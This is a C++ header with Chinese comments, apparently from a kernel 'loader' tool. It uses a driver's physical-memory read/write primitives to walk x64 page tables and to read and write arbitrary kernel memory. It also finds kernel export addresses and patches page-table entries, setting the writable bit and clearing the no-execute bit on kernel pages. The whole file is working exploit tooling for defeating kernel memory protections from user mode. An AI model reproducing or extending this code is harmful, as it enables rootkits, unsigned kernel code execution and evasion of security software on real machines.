#pragma once
#include "loader_common.h"
#include "whql_io.h"

// ============================================================
// phys_walk.h — 用户态物理内存页表遍历（VA → PA 转换）
//
// 基于 GET_INFO 提供的 CR3（系统进程页目录基址），
// 通过 WHQL READ 原语物理读取 PML4/PDPT/PD/PT 页表，
// 将任意内核 VA 转换为物理地址（PA）。
//
// 支持：
//   4KB 普通页（PT 级）
//   2MB 大页（PD 级 PS=1）
//   1GB 超大页（PDPT 级 PS=1）
// ============================================================

// PTE 位定义
#define PTE_PRESENT    (1ULL << 0)
#define PTE_RW         (1ULL << 1)
#define PTE_ACCESSED   (1ULL << 5)
#define PTE_DIRTY      (1ULL << 6)
#define PTE_PS         (1ULL << 7)   // Large Page (PS=1)
#define PTE_GLOBAL     (1ULL << 8)
#define PTE_NX         (1ULL << 63)
#define PTE_PFN_MASK   0x000FFFFFFFFFF000ULL

// 读一个 8 字节物理 QWORD
static bool ReadPhysQword(HANDLE hDev, uint64_t pa, uint64_t* val)
{
    return WhqlReadPhys(hDev, pa, val, 8);
}

// 从 PFN（Page Frame Number）得到物理基址
static inline uint64_t PfnToPhys(uint64_t pte) {
    return pte & PTE_PFN_MASK;
}

// ---- VA → PA 核心转换 ----
// 返回 true 并填写 *pPhysAddr，返回 false 表示页不存在
static bool VirtToPhys(HANDLE hDev, uint64_t cr3, uint64_t va, uint64_t* pPhysAddr)
{
    // 提取各级索引（9 位）
    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pd_idx   = (va >> 21) & 0x1FF;
    uint64_t pt_idx   = (va >> 12) & 0x1FF;
    uint64_t page_off =  va        & 0xFFF;

    // --- 级别 1：PML4 ---
    uint64_t pml4_pa  = (cr3 & PTE_PFN_MASK) + pml4_idx * 8;
    uint64_t pml4e    = 0;
    if (!ReadPhysQword(hDev, pml4_pa, &pml4e) || !(pml4e & PTE_PRESENT))
        return false;

    // --- 级别 2：PDPT ---
    uint64_t pdpt_pa  = PfnToPhys(pml4e) + pdpt_idx * 8;
    uint64_t pdpte    = 0;
    if (!ReadPhysQword(hDev, pdpt_pa, &pdpte) || !(pdpte & PTE_PRESENT))
        return false;
    if (pdpte & PTE_PS) {
        // 1GB 超大页
        *pPhysAddr = PfnToPhys(pdpte) + (va & 0x3FFFFFFF);
        return true;
    }

    // --- 级别 3：PD ---
    uint64_t pd_pa    = PfnToPhys(pdpte) + pd_idx * 8;
    uint64_t pde      = 0;
    if (!ReadPhysQword(hDev, pd_pa, &pde) || !(pde & PTE_PRESENT))
        return false;
    if (pde & PTE_PS) {
        // 2MB 大页
        *pPhysAddr = PfnToPhys(pde) + (va & 0x1FFFFF);
        return true;
    }

    // --- 级别 4：PT ---
    uint64_t pt_pa    = PfnToPhys(pde) + pt_idx * 8;
    uint64_t pte      = 0;
    if (!ReadPhysQword(hDev, pt_pa, &pte) || !(pte & PTE_PRESENT))
        return false;

    *pPhysAddr = PfnToPhys(pte) + page_off;
    return true;
}

// ---- 获取指定内核 VA 对应的 PTE 物理地址（即便该 PTE 当前尚未被标记为 Present）----
// 只要父级页表（PML4 / PDPT / PD）存在，即可定位到该 PTE 条目的物理地址
static bool GetPtePhysAddr(HANDLE hDev, uint64_t cr3, uint64_t va, uint64_t* outPtePA, uint64_t* outPteVal)
{
    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pd_idx   = (va >> 21) & 0x1FF;
    uint64_t pt_idx   = (va >> 12) & 0x1FF;

    // PML4
    uint64_t pml4_pa  = (cr3 & PTE_PFN_MASK) + pml4_idx * 8;
    uint64_t pml4e    = 0;
    if (!ReadPhysQword(hDev, pml4_pa, &pml4e) || !(pml4e & PTE_PRESENT))
        return false;

    // PDPT
    uint64_t pdpt_pa  = PfnToPhys(pml4e) + pdpt_idx * 8;
    uint64_t pdpte    = 0;
    if (!ReadPhysQword(hDev, pdpt_pa, &pdpte) || !(pdpte & PTE_PRESENT))
        return false;
    if (pdpte & PTE_PS)
        return false;

    // PD
    uint64_t pd_pa    = PfnToPhys(pdpte) + pd_idx * 8;
    uint64_t pde      = 0;
    if (!ReadPhysQword(hDev, pd_pa, &pde) || !(pde & PTE_PRESENT))
        return false;
    if (pde & PTE_PS)
        return false;

    // PT 级
    uint64_t pt_pa    = PfnToPhys(pde) + pt_idx * 8;
    if (outPtePA) *outPtePA = pt_pa;

    if (outPteVal) {
        uint64_t val = 0;
        if (ReadPhysQword(hDev, pt_pa, &val)) {
            *outPteVal = val;
        } else {
            *outPteVal = 0;
        }
    }
    return true;
}

// 确保指定内核 VA 所在物理页在内核虚拟地址中具有可写权限（PTE.RW = 1）
static bool EnsureKernelPageWritable(HANDLE hDev, uint64_t cr3, uint64_t va, uint64_t* outOldPte = nullptr, uint64_t* outPtePA = nullptr)
{
    uint64_t ptePA = 0, oldPte = 0;
    if (!GetPtePhysAddr(hDev, cr3, va, &ptePA, &oldPte)) {
        return false;
    }
    if (outOldPte) *outOldPte = oldPte;
    if (outPtePA)  *outPtePA  = ptePA;
    if (!(oldPte & PTE_RW)) {
        uint64_t newPte = oldPte | PTE_RW;
        if (!WhqlWritePhys(hDev, ptePA, &newPte, sizeof(newPte))) {
            return false;
        }
        LOG_INFO("EnsureKernelPageWritable: enabled RW for VA=0x%016llX (PTE @ 0x%016llX, Old=0x%016llX, New=0x%016llX)",
                 va, ptePA, oldPte, newPte);
    }
    return true;
}

// 恢复指定内核 VA 对应 PTE 的原始属性
static inline bool RestoreKernelPagePte(HANDLE hDev, uint64_t ptePA, uint64_t oldPte)
{
    if (!ptePA || !oldPte) return false;
    return WhqlWritePhys(hDev, ptePA, &oldPte, sizeof(oldPte));
}

// 确保指定内核 VA 所在物理页具备内核可写与可执行权限（PTE.RW = 1, PTE.NX = 0）
static inline bool EnsureKernelPageExecutable(HANDLE hDev, uint64_t cr3, uint64_t va, uint64_t* outOldPte = nullptr, uint64_t* outPtePA = nullptr)
{
    uint64_t ptePA = 0, oldPte = 0;
    if (!GetPtePhysAddr(hDev, cr3, va, &ptePA, &oldPte)) {
        return false;
    }
    if (outOldPte) *outOldPte = oldPte;
    if (outPtePA)  *outPtePA  = ptePA;
    const uint64_t PTE_NX_BIT = (1ULL << 63);
    uint64_t newPte = (oldPte | PTE_RW) & ~PTE_NX_BIT;
    if (newPte != oldPte) {
        if (!WhqlWritePhys(hDev, ptePA, &newPte, sizeof(newPte))) {
            return false;
        }
        LOG_INFO("EnsureKernelPageExecutable: enabled RW & cleared NX for VA=0x%016llX (Old=0x%016llX, New=0x%016llX)",
                 va, oldPte, newPte);
    }
    return true;
}

// ---- 读取内核任意虚拟地址处的数据（转换后物理读）----
// 自动处理跨页情况
static bool ReadKernelVA(HANDLE hDev, uint64_t cr3, uint64_t va, void* buf, size_t len)
{
    uint8_t* dst = (uint8_t*)buf;
    size_t   done = 0;
    while (done < len) {
        uint64_t curVA   = va + done;
        uint64_t pageOff = curVA & 0xFFF;
        size_t   canRead = min(0x1000 - (size_t)pageOff, len - done);

        uint64_t pa = 0;
        if (!VirtToPhys(hDev, cr3, curVA, &pa))
            return false;

        if (!WhqlReadPhys(hDev, pa, dst + done, canRead))
            return false;

        done += canRead;
    }
    return true;
}

// ---- 写入内核任意虚拟地址（自动处理跨页）----
static bool WriteKernelVA(HANDLE hDev, uint64_t cr3, uint64_t va, const void* buf, size_t len)
{
    const uint8_t* src = (const uint8_t*)buf;
    size_t   done = 0;
    while (done < len) {
        uint64_t curVA   = va + done;
        uint64_t pageOff = curVA & 0xFFF;
        size_t   canWrite = min(0x1000 - (size_t)pageOff, len - done);

        uint64_t pa = 0;
        if (!VirtToPhys(hDev, cr3, curVA, &pa))
            return false;

        if (!WhqlWritePhys(hDev, pa, src + done, canWrite))
            return false;

        done += canWrite;
    }
    return true;
}

// ---- 从 KernelBase 解析 PE 导出表，查找函数 VA ----
static uint64_t FindKernelExport(HANDLE hDev, uint64_t cr3,
                                  uint64_t kernBase, const char* funcName)
{
    // 读取 DOS 头
    uint8_t dosHdr[0x40] = {};
    if (!ReadKernelVA(hDev, cr3, kernBase, dosHdr, sizeof(dosHdr)))
        return 0;
    if (*(uint16_t*)dosHdr != 0x5A4D) return 0;  // MZ

    uint32_t e_lfanew = *(uint32_t*)(dosHdr + 0x3C);
    uint8_t ntHdr[0x18 + 0xF0] = {};  // 足够容纳 OptionalHeader64
    if (!ReadKernelVA(hDev, cr3, kernBase + e_lfanew, ntHdr, sizeof(ntHdr)))
        return 0;
    if (*(uint32_t*)ntHdr != 0x00004550) return 0;  // PE\0\0

    // DataDirectory[0] = Export Directory
    uint32_t exportRVA  = *(uint32_t*)(ntHdr + 0x18 + 0x70);
    if (!exportRVA) return 0;

    // 读取 IMAGE_EXPORT_DIRECTORY
    uint8_t expDir[0x28] = {};
    if (!ReadKernelVA(hDev, cr3, kernBase + exportRVA, expDir, sizeof(expDir)))
        return 0;

    uint32_t numNames    = *(uint32_t*)(expDir + 0x18);
    uint32_t addrOfFuncs = *(uint32_t*)(expDir + 0x1C);
    uint32_t addrOfNames = *(uint32_t*)(expDir + 0x20);
    uint32_t addrOfOrds  = *(uint32_t*)(expDir + 0x24);

    for (uint32_t i = 0; i < numNames; i++) {
        // 读取函数名 RVA
        uint32_t nameRVA = 0;
        if (!ReadKernelVA(hDev, cr3, kernBase + addrOfNames + i * 4, &nameRVA, 4))
            continue;

        // 读取函数名（最多 128 字节）
        char name[128] = {};
        ReadKernelVA(hDev, cr3, kernBase + nameRVA, name, sizeof(name) - 1);

        if (strcmp(name, funcName) == 0) {
            // 读取对应序号
            uint16_t ord = 0;
            ReadKernelVA(hDev, cr3, kernBase + addrOfOrds + i * 2, &ord, 2);
            // 读取函数地址 RVA
            uint32_t funcRVA = 0;
            ReadKernelVA(hDev, cr3, kernBase + addrOfFuncs + ord * 4, &funcRVA, 4);
            return kernBase + funcRVA;
        }
    }
    return 0;
}
